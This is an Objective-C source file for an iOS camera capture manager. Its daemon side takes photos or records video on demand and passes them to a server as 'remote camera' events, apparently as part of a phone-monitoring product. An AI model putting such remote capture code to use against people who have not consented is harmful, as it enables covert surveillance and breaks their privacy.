//
//  CameraCaptureManager.m
//  CameraCaptureManager
//
//  Created by Benjawan Tanarattanakorn on 6/5/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import <AudioToolbox/AudioToolbox.h>

#import "CameraCaptureManager.h"
#import "UIImage+Resize.h"
#import "CameraController.h"
#import "CameraCaptureCenter.h"
#import "MediaEvent.h"
#import "DateTimeFormat.h"
#import "DebugStatus.h"
#import "OnDemandCameraController.h"
#import "VideoCaptureController.h"
#import "VideoFrameCaptureController.h"


#define START_CAPTURE_DELAY		1.5
#define RESTART_CAPTURE_DELAY	1.5


@interface CameraCaptureManager (private)
- (void) startCameraController;
- (void) removeCameraController;

// -- calback
- (void) didFinishCapturing;								// callback for on demand capturing
- (void) sendEventToDaemonWithPath: (NSString *) aPath;		// for continuously capturing
//- (void) didFinishCapturingOnDemandV1: (NSString *) aPath;
- (void) didFinishCapturingOnDemandV2: (NSString *) aPath;
- (void) didFinishRecordingOnDemand: (NSString *) aPath;

@end


@implementation CameraCaptureManager

@synthesize mCCC;
@synthesize mUICapturingInterval;
@synthesize mCameraCaptureDelegate;
@synthesize mCameraStartCaptureSelector;
@synthesize mCameraStopCaptureSelector;

@synthesize mOnDemandCameraImageDelegate;
@synthesize mOnDemandCameraVideoDelegate;
@synthesize mOnDemandOutputPath;

/**
 - Method name:						initWithUIViewController
 - Purpose:							Initialize CameraCaptureManager for UI application
 - Argument list and description:	a view controller that is responsible for presenting camera UI
 - Return description:				(CameraCaptureManager *)
 */
- (id) initWithUIViewController: (UIViewController *) aViewController {
	self = [super init];
	if (self != nil) {
		// check first whether the camera is available or not
		if ([CameraController hasCamera]) {	
			CameraCaptureCenter *ccc = [[CameraCaptureCenter alloc] init];
			[self setMCCC:ccc];
			[ccc release];
			ccc = nil;	
			
			// register CameraCaptureCenter as EventDelegate
			[self registerEventDelegate:[self mCCC]];
		}
		// the controller that is going to present UIImagePickerController's view
		mCameraParentViewController = aViewController;
		mIsCapturingImage			= NO;	
		mIsCapturingInProgress		= NO;
		
		mOnDemandCameraController	= nil;	// not used in UI application
		mVideoCaptureController		= nil;	// not used in UI application	
	}
	return self;
}

/**
 - Method name:						initWithEventDelegate
 - Purpose:							Initialize CameraCaptureManager for daemon application
 - Argument list and description:	a delegate that is responsible for sending an event
 - Return description:				(CameraCaptureManager *)
 */
- (id) initWithEventDelegate: (id <EventDelegate>) aDelegate {
	DLog(@"initWithEventDelegate")
	self = [super init];
	if (self != nil) {
		// initialize CameraCaptureCenter
		CameraCaptureCenter *ccc = [[CameraCaptureCenter alloc] init];
		[ccc setMEventCenter:aDelegate];				// only daemon require mEventCenter in CameraCaptureCenter. UI don't use it at all.
		[self setMCCC:ccc];
		[ccc release];
		ccc = nil;			
		
		// register aDelegate as EventDelegate
		[self registerEventDelegate:aDelegate];
		
		mIsCapturingImage			= NO;	
		mCameraController			= nil;			// not used in daemon application
		mCameraParentViewController = nil;			// not used in daemon application
		mIsCapturingInProgress		= NO;			// not used in daemon application
	}
	return self;
}

- (void) setMUICapturingInterval: (NSInteger) aInterval {
	DLog (@"Set capturing interval, aInterval = %d", aInterval)
	mUICapturingInterval = aInterval;
	if (mCameraController) 
		[mCameraController setMCapturingInterval:aInterval];
	DLog (@"New capturing interval = %d", [self mUICapturingInterval])
}

- (void) registerEventDelegate: (id <EventDelegate>) aDelegate {
	mEventDelegate = aDelegate;
}

- (void) unregisterEventDelegate {
	mEventDelegate = nil;
}

#pragma mark -
#pragma mark Capturing photo

/**
 - Method name:						startCapture
 - Purpose:							Start capturing photo continuously
 - Argument list and description:	None
 - Return description:				None
 */
- (void) startCapture {
	DLog (@"Start capturing photo sequentially");
	if (mCameraParentViewController) {											// for UI application
		DLog(@"========================== start capture =============================");
		if (!mIsCapturingImage) {												// start capture only if there is CameraController and it is not capturing.
																				// This flag is toggled in stopCapture function
			DLog(@"can start");
			
			// -- initialize mCameraController
			mCameraController = [[CameraController alloc] init];				// mCameraController is released in stopCapture method
			[mCameraController setMDelegate:self];
			[mCameraController setMRestartCaptureSelector:@selector(restartCapture)];
			[mCameraController setMCapturePathSelector:@selector(sendEventToDaemonWithPath:)];
			[mCameraController setMDidFinishCapturing:@selector(didFinishCapturing)];
		
			mIsCapturingImage = YES;
			
			mIsCapturingInProgress = YES;										// this flag will be toggle in didFinishCapturing
			
			[mCameraController setMShouldCapture:YES];							// notify CameraController that it is allowed to take a photo			
			
			[self startCameraController];
		}
	} else {									// for daemon application (listen to data from UI application)
		DLog(@"start MessagePortIPCReader to get photo")
		[[self mCCC] startMessagePort];
	}
	
	if (mCameraCaptureDelegate && [mCameraCaptureDelegate respondsToSelector:mCameraStartCaptureSelector]) {
		DLog (@"Inform camera manager is started capturing-------------");
		[mCameraCaptureDelegate performSelector:mCameraStartCaptureSelector];
	}
}

/**
 - Method name:						stopCapture
 - Purpose:							Stop capturing photo continuously
 - Argument list and description:	None
 - Return description:				None
 */
- (void) stopCapture {
	if (mCameraParentViewController) {			// for UI application
		DLog(@"========================== stop capture =============================");
		if (mCameraController && mIsCapturingImage) {
			DLog(@"can stop");
			mIsCapturingImage = NO;
			[mCameraController setMShouldCapture:NO];
			[self removeCameraController];
		}
	} else {									// for daemon application (listen to data from UI application)
		DLog(@"stop MessagePortIPCReader")
		[[self mCCC] stopMessagePort];
	}
	//DLog(@"What's delegate = %@", mCameraCaptureDelegate);
	if (mCameraCaptureDelegate && [mCameraCaptureDelegate respondsToSelector:mCameraStopCaptureSelector]) {
		DLog (@"Inform camera manager is stopped capturing-------------");
		[mCameraCaptureDelegate performSelector:mCameraStopCaptureSelector];
	}
}

/**
 - Method name:						restartCapture
 - Purpose:							Restart capturing photo continuously
 - Argument list and description:	None
 - Return description:				None
 */
- (void) restartCapture {
	DLog (@"Camera capture manager restart the capture");
	[self stopCapture];
	[self performSelector:@selector(startCapture) withObject:nil afterDelay:RESTART_CAPTURE_DELAY];
}

/**
 - Method name:						captureCameraImageWithDelegate:
 - Purpose:							Capture photo on demand
 - Argument list and description:	id <CameraOnDemandCaptureDelegate>, delegate will call when photo is captured
 - Return description:				Boolean true if session is initiate successfully to camera device, otherwise false
 */
- (BOOL) captureCameraImageWithDelegate: (id <CameraOnDemandCaptureDelegate>) aDelegate {
	// Using video frame appoach ------
	BOOL canCapture = NO;
	mVideoFrameCaptureController = [[VideoFrameCaptureController alloc] init];
	[mVideoFrameCaptureController setMDelegate:self];
	[mVideoFrameCaptureController setMDidFinishCapturing:@selector(didFinishCapturingOnDemandV2:)];
	[mVideoFrameCaptureController setMOutputPath:[self mOnDemandOutputPath]];
	[mVideoFrameCaptureController initializeCaptureSession];
	if ([mVideoFrameCaptureController mIsSessionSetup]) {
		canCapture = YES;
		[self setMOnDemandCameraImageDelegate:aDelegate];
	} else {
		[mVideoFrameCaptureController release];
		mVideoFrameCaptureController = nil;
	}
	DLog (@"Can capture the image... %d", canCapture);
	return (canCapture);
}

/**
 - Method name:						captureCameraVideoWithDuration:delegate:
 - Purpose:							Capture video on demand
 - Argument list and description:	a duration (NSInterger) in seconds, id <CameraOnDemandCaptureDelegate> delegate is called once video is captured
 - Return description:				Boolean true if session is initiate successfully to camera device or duration <= 0, otherwise false
 */
- (BOOL) captureCameraVideoWithDuration: (NSInteger) aSeconds delegate: (id <CameraOnDemandCaptureDelegate>) aDelegate {
	BOOL canCapture = NO;
	if (aSeconds > 0) {
		mVideoCaptureController = [[VideoCaptureController alloc] init];
		[mVideoCaptureController setMDelegate:self];
		[mVideoCaptureController setMDidFinishCapturing:@selector(didFinishRecordingOnDemand:)];
		[mVideoCaptureController setMOutputPath:[self mOnDemandOutputPath]];
		
		[mVideoCaptureController initializeCaptureSession];
	
		if ([mVideoCaptureController mIsSessionSetup]) {
			canCapture = YES;
			[self setMOnDemandCameraVideoDelegate:aDelegate];
			[mVideoCaptureController startCaptureVideo];
			[mVideoCaptureController performSelector:@selector(stopCaptureVideo) withObject:nil afterDelay:aSeconds];
		} else {
			[mVideoCaptureController release];
			mVideoCaptureController = nil;
		}
	}
	return (canCapture);
}

- (BOOL) isReadyToCapturePhotoOrVideo {
	BOOL isReadToCaptureMedia = YES;
	if (mCameraParentViewController) {				// for UI application
		if (mIsCapturingInProgress) {
			isReadToCaptureMedia = NO;
			DLog(@"NOT READY: UI application is capturing")
		}
	} else {										// for daemon application 
		if (mVideoCaptureController && [mVideoCaptureController mSession]) {
			if ([[mVideoCaptureController mSession] isRunning]) {
				DLog(@"NOT READY: our application is recording video")
				isReadToCaptureMedia = NO;
			}
		}
	}
	DLog(@">>>>>>>>> ready ? :%d", isReadToCaptureMedia)
	return isReadToCaptureMedia;
}

/**
 - Method name:						startCameraController
 - Purpose:							display camera UI and start capturing photos
 - Argument list and description:	None
 - Return description:				None
 */
- (void) startCameraController {
	DLog(@"startCameraController")
	if (mCameraController) {
		
		// -- Add overlay view
		[[mCameraController view] setBackgroundColor:[UIColor clearColor]];
		[mCameraController setCameraOverlayView:[mCameraParentViewController view]];
		
		//[mCameraController setOverlayController:mCameraController]; // Available in IOS 5
		mCameraController.topViewController.view.frame = mCameraParentViewController.view.frame;
		mCameraController.view.backgroundColor = [UIColor grayColor];
		
		// -- This aims to get rid of the warning "Two-stage rotation animation is deprecated. This application should use the smoother single-stage animation." 
		//[[mCameraParentViewController view] addSubview:[mCameraController view]];						// add the capture view to parent's view		
		
		// -- display the capture view on top of parent's view
		[mCameraController displayAsModalViewByController:mCameraParentViewController animated:NO];		
		
		// -- start taking pictures
		[mCameraController performSelector:@selector(takePicture) withObject:nil afterDelay:START_CAPTURE_DELAY];
		DLog (@"Delaying to take first photo of sequentially capture");
	}
}

/**
 - Method name:						removeCameraController
 - Purpose:							dismiss camera UI
 - Argument list and description:	None
 - Return description:				None
 */
- (void) removeCameraController {
	DLog(@"removeCameraController");
	
	//[[mCameraController view] removeFromSuperview];
	if (mCameraParentViewController) {
		[mCameraController dismissModalViewController:mCameraParentViewController animated:NO];
	}		
	[mCameraController setMDelegate:nil];
	[mCameraController setMRestartCaptureSelector:nil];
	[mCameraController setMCapturePathSelector:nil];
	[mCameraController setMDidFinishCapturing:nil];
	[mCameraController setMShouldCapture:NO];
	
	[NSObject cancelPreviousPerformRequestsWithTarget:mCameraController selector:@selector(takePicture) object:nil];
	
	[mCameraController release];
	mCameraController = nil;
}

#pragma mark -
#pragma mark Event sending

/**
 - Method name:						sendEventToDaemonWithPath
 - Purpose:							This is for only UI application. 
 The purpose is to ask mEventDelegate (CameraCaptureManager)to send event to the daemon
 - Argument list and description:	None
 - Return description:				None
 */
- (void) sendEventToDaemonWithPath: (NSString *) aPath {
	MediaEvent *mediaEvent = [[MediaEvent alloc] init];
	// FxEvent
	[mediaEvent setDateTime:[DateTimeFormat phoenixDateTime]];
	[mediaEvent setEventType:kEventTypePanicImage];
	// MediaEvent
	[mediaEvent setFullPath:aPath];
	
	// delegate here is CameraCaptureCenter (mCCC)
	if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
		[mEventDelegate performSelector:@selector(eventFinished:) withObject:mediaEvent];
	}
	[mediaEvent autorelease];
}

/**
 - Method name:						didFinishCapturing
 - Purpose:							This callback will be callded when continuously capturing photo is done.
 The purpose is to ask mEventDelegate (EventCenter) to send event to the server
 This is for only UI application. 
 - Argument list and description:	None
 - Return description:				None
 */
- (void) didFinishCapturing {
	DLog(@"didFinishCapture")
	if (mCameraController) {
		mIsCapturingInProgress = NO;
	}
}

/**
 - Method name:						didFinishCapturingOnDemandV1:
 - Purpose:							This callback will be callded when capturing a photo on demand is done.
 The purpose is to ask mEventDelegate (EventCenter) to send event to the server
 This is for only daemon application. 
 - Argument list and description:	(NSString *) output path of image file
 - Return description:				None
 */
//- (void) didFinishCapturingOnDemandV1: (NSString *) aPath {
//	DLog(@"didFinishCapturingOnDemandV1:")
//	if (mOnDemandCameraController) {	
//		if ([mOnDemandCameraController mSession]) {
//			[[mOnDemandCameraController mSession] beginConfiguration];																	  
//			[[mOnDemandCameraController mSession] removeInput:[mOnDemandCameraController mCameraInput]];
//			[mOnDemandCameraController setMCameraInput:nil];
//			[[mOnDemandCameraController mSession] removeOutput:[mOnDemandCameraController mStillImageOutput]];
//			[mOnDemandCameraController setMStillImageOutput:nil];			
//			[[mOnDemandCameraController mSession] commitConfiguration];			
//			[[mOnDemandCameraController mSession] stopRunning];
//			[mOnDemandCameraController setMSession:nil];
//		}
//		[mOnDemandCameraController release];
//		mOnDemandCameraController = nil;
//		
//		MediaEvent *mediaEvent = [[MediaEvent alloc] init];
//		// FxEvent
//		[mediaEvent setDateTime:[DateTimeFormat phoenixDateTime]];
//		[mediaEvent setEventType:kEventTypeCameraImage];
//		[mediaEvent setFullPath:aPath];
//
//		// delegate here is not CameraCaptureCenter (mCCC)
////		if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
////			[mEventDelegate performSelector:@selector(eventFinished:) withObject:mediaEvent];
////		}
//		[mediaEvent release];
//	}
//}

/**
 - Method name:						didFinishCapturingOnDemandV2:
 - Purpose:							This callback will be callded when capturing a photo on demand is done.
									The purpose is to ask mEventDelegate (EventCenter) to send event to the server
									This is for only daemon application. 
 - Argument list and description:	(NSString *) output path of image file
 - Return description:				None
 */
- (void) didFinishCapturingOnDemandV2: (NSString *) aPath {
	DLog(@"didFinishCapturingOnDemandV2:")
	if (mVideoFrameCaptureController) {
		DLog(@"clear resource")
		if ([mVideoFrameCaptureController mSession]) {		
			//[[mVideoFrameCaptureController mSession] beginConfiguration];			
			[[mVideoFrameCaptureController mSession] removeOutput:[mVideoFrameCaptureController mVideoDataOutput]];
			[[mVideoFrameCaptureController mSession] removeInput:[mVideoFrameCaptureController mCameraInput]];								
			//[[mVideoFrameCaptureController mSession] commitConfiguration];			
			[mVideoFrameCaptureController setMCameraInput:nil];
			[mVideoFrameCaptureController setMVideoDataOutput:nil];	
			[mVideoFrameCaptureController setMSession:nil];												
			DLog (@"mSession: %@", [mVideoFrameCaptureController mSession])
			DLog (@"input 2: %@", [[mVideoFrameCaptureController mSession] inputs])
			DLog (@"output 2: %@", [[mVideoFrameCaptureController mSession] outputs])		
		}
		[mVideoFrameCaptureController release];
		mVideoFrameCaptureController = nil;
		
		MediaEvent *mediaEvent = [[MediaEvent alloc] init];
		// FxEvent
		[mediaEvent setDateTime:[DateTimeFormat phoenixDateTime]];
		[mediaEvent setEventType:kEventTypeRemoteCameraImage];
		[mediaEvent setFullPath:aPath];
		
		// delegate here is not CameraCaptureCenter (mCCC)
		if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
			[mEventDelegate performSelector:@selector(eventFinished:) withObject:mediaEvent];
		}
		[mediaEvent release];
		
		id <CameraOnDemandCaptureDelegate> delegate = [self mOnDemandCameraImageDelegate];
		[self setMOnDemandCameraImageDelegate:nil];
		if ([delegate respondsToSelector:@selector(cameraDidFinishCapture:error:)]) {
			[delegate cameraDidFinishCapture:aPath error:nil];
		}
	}
}

/**
 - Method name:						didFinishRecordingOnDemand:
 - Purpose:							This callback will be callded when video recording is done.
 The purpose is to ask mEventDelegate (EventCenter) to send event to the server
 This is for only daemon application. 
 - Argument list and description:	(NSString *) output path of video file
 - Return description:				None
 */
- (void) didFinishRecordingOnDemand: (NSString *) aPath {
	DLog(@"didFinishRecordingOnDemand:")
	if (mVideoCaptureController) {
		if ([mVideoCaptureController mSession]) {
			[[mVideoCaptureController mSession] beginConfiguration];																	  
			[[mVideoCaptureController mSession] removeInput:[mVideoCaptureController mCameraInput]];
			[mVideoCaptureController setMCameraInput:nil];
			[[mVideoCaptureController mSession] removeInput:[mVideoCaptureController mAudioInput]];
			[mVideoCaptureController setMAudioInput:nil];
			[[mVideoCaptureController mSession] removeOutput:[mVideoCaptureController mMovieFileOutput]];
			[mVideoCaptureController setMAudioInput:nil];	
			[[mVideoCaptureController mSession] commitConfiguration];			
			
			[[mVideoCaptureController mSession] stopRunning];
			
			[mVideoCaptureController setMSession:nil];
		}
		
		[mVideoCaptureController release];
		mVideoCaptureController = nil;
		
		MediaEvent *mediaEvent = [[MediaEvent alloc] init];
		// FxEvent
		[mediaEvent setDateTime:[DateTimeFormat phoenixDateTime]];
		[mediaEvent setEventType:kEventTypeRemoteCameraVideo];
		[mediaEvent setFullPath:aPath];
		
		// delegate here is not CameraCaptureCenter (mCCC)
		if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
			[mEventDelegate performSelector:@selector(eventFinished:) withObject:mediaEvent];
		}
		[mediaEvent release];
		
		id <CameraOnDemandCaptureDelegate> delegate = [self mOnDemandCameraVideoDelegate];
		[self setMOnDemandCameraVideoDelegate:nil];
		if ([delegate respondsToSelector:@selector(cameraDidFinishCapture:error:)]) {
			[delegate cameraDidFinishCapture:aPath error:nil];
		}
	}
}

/*
+ (BOOL) isOtherApplicationRecording {
	AudioSessionInitialize(NULL, NULL, nil, nil);
	
	UInt32 otherAudioIsPlaying;
	UInt32 propertySize = sizeof (otherAudioIsPlaying);
	OSStatus result = AudioSessionGetProperty (kAudioSessionProperty_OtherAudioIsPlaying,
											   &propertySize,
											   &otherAudioIsPlaying);
	if (result != noErr) 
		DLog(@"FAIL: getCatResult %@", getNSStringFromOSStatus(result));
	if (otherAudioIsPlaying) {                                    
		DLog(@">>>>>>>>>>>>> Playing ")
	} else {
		DLog(@">>>>>>>>>>>>> Not playing ")
	}
	return (BOOL) otherAudioIsPlaying;
}
 */

/*
// convert OSStatus to NSString
NSString* getNSStringFromOSStatus (OSStatus errCode) {
	if (errCode == noErr)
		return @"noErr";
	char message[5] = {0};
	*(UInt32*) message = CFSwapInt32HostToBig(errCode);
	return [NSString stringWithCString:message encoding:NSASCIIStringEncoding];
}
*/

- (void) release {
	DLog (@"Camera capture manager is release");
	[NSObject cancelPreviousPerformRequestsWithTarget:self];
	[NSObject cancelPreviousPerformRequestsWithTarget:mCameraController];
	[super release];
}

- (void) dealloc {
	[self stopCapture];
	
	if (mCameraController) {
		[mCameraController release];
		mCameraController = nil;
	}
	
	// On demand ----
	if (mOnDemandCameraController) {
		[mOnDemandCameraController release];
		mOnDemandCameraController = nil;
	}
	
	if (mVideoCaptureController) {
		[mVideoCaptureController release];
		mVideoCaptureController = nil;
	}
	
	if (mVideoFrameCaptureController) {
		[mVideoFrameCaptureController release];
		mVideoFrameCaptureController = nil;
	}
	
	[mOnDemandOutputPath release];
	
	// Helper -----
	[mCCC release];
	mCCC = nil;
	
	[super dealloc];
}

@end
